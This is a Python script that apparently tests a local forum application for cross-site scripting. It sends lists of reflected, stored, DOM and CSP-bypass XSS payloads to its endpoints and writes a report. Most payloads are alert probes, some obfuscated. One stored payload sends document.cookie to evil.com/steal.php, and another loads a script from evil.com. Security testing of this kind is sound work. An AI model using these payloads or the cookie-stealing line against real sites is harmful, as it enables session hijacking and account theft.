#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Attack Test Script
This script tests for XSS vulnerabilities in the MDB application
"""

import requests
import json
import sys
import time
from urllib.parse import quote

# Configuration
BASE_URL = "http://localhost:8080"
API_URL = f"{BASE_URL}/api"

class XSSAttackTester:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.auth_token = None
        
    def authenticate(self):
        """Attempt to get authentication token for testing authenticated endpoints"""
        print("🔐 Attempting to authenticate for XSS testing...")
        
        # For testing purposes, we'll simulate having a token
        # In a real attack, this would be obtained through OAuth2 flow
        self.auth_token = "test-token-for-xss-testing"
        
    def test_reflected_xss(self):
        """Test for reflected XSS vulnerabilities"""
        print("🔍 Testing Reflected XSS...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<div onmouseover=\"alert('XSS')\">Hover me</div>"
        ]
        
        # Test search parameter for reflected XSS
        for payload in xss_payloads:
            try:
                response = self.session.get(
                    f"{API_URL}/forums/threads",
                    params={"search": payload},
                    timeout=10
                )
                
                if self.check_xss_reflection(response, payload):
                    self.vulnerabilities.append({
                        "type": "Reflected XSS",
                        "endpoint": "/api/forums/threads",
                        "parameter": "search",
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": "Payload reflected in response without proper encoding"
                    })
                    print(f"🚨 REFLECTED XSS FOUND: {payload}")
                    
            except Exception as e:
                print(f"❌ Error testing reflected XSS payload {payload}: {e}")
    
    def test_stored_xss(self):
        """Test for stored XSS vulnerabilities"""
        print("🔍 Testing Stored XSS...")
        
        stored_xss_payloads = [
            "<script>alert('Stored XSS')</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "<svg onload=alert('Stored XSS')>",
            "<<SCRIPT>alert('Stored XSS')</SCRIPT>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<iframe src=javascript:alert('Stored XSS')></iframe>",
            "<object data=\"javascript:alert('Stored XSS')\">",
            "<embed src=\"javascript:alert('Stored XSS')\">",
            "<link rel=stylesheet href=\"javascript:alert('Stored XSS')\">",
            "<style>@import'javascript:alert(\"Stored XSS\")';</style>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('Stored XSS')\">",
            "<form><button formaction=javascript:alert('Stored XSS')>Click</button></form>",
            "<input type=image src=x onerror=alert('Stored XSS')>",
            "<table background=\"javascript:alert('Stored XSS')\">",
            "<div style=\"background-image:url(javascript:alert('Stored XSS'))\">",
            "<style>body{background:url('javascript:alert(\"Stored XSS\")')}</style>",
            "<script>setTimeout('alert(\"Stored XSS\")',1000)</script>",
            "<script>setInterval('alert(\"Stored XSS\")',1000)</script>",
            "<script>eval(atob('YWxlcnQoJ1N0b3JlZCBYU1MnKQ=='))</script>",  # Base64 encoded alert
            "<script>Function('alert(\"Stored XSS\")')();</script>"
        ]
        
        # Test creating forum threads with XSS payloads
        for payload in stored_xss_payloads:
            try:
                # Test in thread title
                thread_data = {
                    "title": payload,
                    "content": "Test content"
                }
                
                response = self.session.post(
                    f"{API_URL}/forums/threads",
                    json=thread_data,
                    headers={"Authorization": f"Bearer {self.auth_token}"} if self.auth_token else {},
                    timeout=10
                )
                
                if response.status_code in [200, 201]:
                    print(f"⚠️  Stored XSS payload accepted in thread title: {payload}")
                    
                # Test in thread content
                thread_data = {
                    "title": "Test Thread",
                    "content": payload
                }
                
                response = self.session.post(
                    f"{API_URL}/forums/threads",
                    json=thread_data,
                    headers={"Authorization": f"Bearer {self.auth_token}"} if self.auth_token else {},
                    timeout=10
                )
                
                if response.status_code in [200, 201]:
                    print(f"⚠️  Stored XSS payload accepted in thread content: {payload}")
                    
            except Exception as e:
                print(f"❌ Error testing stored XSS payload {payload}: {e}")
    
    def test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        print("🔍 Testing DOM-based XSS...")
        
        dom_xss_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('DOM XSS')",
            "#<img src=x onerror=alert('DOM XSS')>",
            "#<svg onload=alert('DOM XSS')>",
            "#';alert('DOM XSS');//",
            "#\";alert('DOM XSS');//",
            "#</script><script>alert('DOM XSS')</script>",
            "#<iframe src=javascript:alert('DOM XSS')></iframe>",
            "#<object data=javascript:alert('DOM XSS')>",
            "#<embed src=javascript:alert('DOM XSS')>"
        ]
        
        # Test URL fragments that might be processed by frontend JavaScript
        for payload in dom_xss_payloads:
            try:
                response = self.session.get(
                    f"{BASE_URL}/{payload}",
                    timeout=10
                )
                
                # Check if payload is reflected in JavaScript context
                if "script" in response.text.lower() and payload.replace("#", "") in response.text:
                    self.vulnerabilities.append({
                        "type": "DOM XSS",
                        "endpoint": f"/{payload}",
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": "Payload reflected in JavaScript context"
                    })
                    print(f"🚨 DOM XSS FOUND: {payload}")
                    
            except Exception as e:
                print(f"❌ Error testing DOM XSS payload {payload}: {e}")
    
    def check_xss_reflection(self, response, payload):
        """Check if XSS payload is reflected in response"""
        response_text = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for direct reflection
        if payload_lower in response_text:
            return True
            
        # Check for partial reflection (common evasion techniques)
        dangerous_tags = ["<script", "<img", "<svg", "<iframe", "<object", "<embed", "javascript:", "onerror", "onload"]
        for tag in dangerous_tags:
            if tag in payload_lower and tag in response_text:
                return True
                
        return False
    
    def test_csp_bypass(self):
        """Test Content Security Policy bypass techniques"""
        print("🔍 Testing CSP Bypass...")
        
        csp_bypass_payloads = [
            "<script nonce=''>alert('CSP Bypass')</script>",
            "<link rel=preload href=//evil.com/xss.js as=script>",
            "<script src=data:,alert('CSP Bypass')></script>",
            "<iframe srcdoc='<script>alert(\"CSP Bypass\")</script>'></iframe>",
            "<object data=data:text/html,<script>alert('CSP Bypass')</script>></object>",
            "<embed src=data:text/html,<script>alert('CSP Bypass')</script>></embed>",
            "<meta http-equiv=refresh content='0;url=javascript:alert(\"CSP Bypass\")'>",
            "<form action=javascript:alert('CSP Bypass')><input type=submit></form>",
            "<details open ontoggle=alert('CSP Bypass')>",
            "<svg><animate onbegin=alert('CSP Bypass')>",
            "<math><maction actiontype=toggle onclick=alert('CSP Bypass')>",
            "<video><source onerror=alert('CSP Bypass')>",
            "<audio src=x onerror=alert('CSP Bypass')>",
            "<style>@import'data:,*{x:expression(alert(\"CSP Bypass\"))}';</style>",
            "<link rel=stylesheet href=data:,*{x:expression(alert('CSP Bypass'))}>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,67,83,80,32,66,121,112,97,115,115,39,41))</script>",
            "<script>Function('alert(\"CSP Bypass\")')();</script>",
            "<script>setTimeout('alert(\"CSP Bypass\")',1)</script>",
            "<script>setInterval('alert(\"CSP Bypass\")',1000)</script>",
            "<script>[].constructor.constructor('alert(\"CSP Bypass\")')();</script>"
        ]
        
        for payload in csp_bypass_payloads:
            try:
                response = self.session.get(
                    f"{API_URL}/forums/threads",
                    params={"search": payload},
                    timeout=10
                )
                
                if self.check_xss_reflection(response, payload):
                    self.vulnerabilities.append({
                        "type": "CSP Bypass XSS",
                        "endpoint": "/api/forums/threads",
                        "payload": payload,
                        "response_code": response.status_code,
                        "evidence": "CSP bypass payload reflected"
                    })
                    print(f"🚨 CSP BYPASS FOUND: {payload}")
                    
            except Exception as e:
                print(f"❌ Error testing CSP bypass payload {payload}: {e}")
    
    def generate_report(self):
        """Generate XSS vulnerability report"""
        print("\n" + "="*60)
        print("🔒 XSS SECURITY AUDIT REPORT")
        print("="*60)
        
        if not self.vulnerabilities:
            print("✅ No XSS vulnerabilities detected!")
            print("✅ Application appears to have proper input sanitization")
        else:
            print(f"🚨 FOUND {len(self.vulnerabilities)} XSS VULNERABILITIES:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Endpoint: {vuln['endpoint']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Evidence: {vuln['evidence']}")
        
        # Save report to file
        with open("c:/Users/Root/Downloads/MDB/security-audit/xss-report.json", "w") as f:
            json.dump(self.vulnerabilities, f, indent=2)
        
        return len(self.vulnerabilities) == 0

def main():
    print("🔒 Starting XSS Security Test")
    print("Target: MDB Application")
    print("="*50)
    
    tester = XSSAttackTester()
    
    # Authenticate for testing
    tester.authenticate()
    
    # Run all XSS tests
    tester.test_reflected_xss()
    tester.test_stored_xss()
    tester.test_dom_xss()
    tester.test_csp_bypass()
    
    # Generate report
    is_secure = tester.generate_report()
    
    if not is_secure:
        print("\n🚨 SECURITY ALERT: XSS vulnerabilities found!")
        print("🔧 Immediate action required to fix these issues")
        sys.exit(1)
    else:
        print("\n✅ XSS tests passed")
        sys.exit(0)

if __name__ == "__main__":
    main()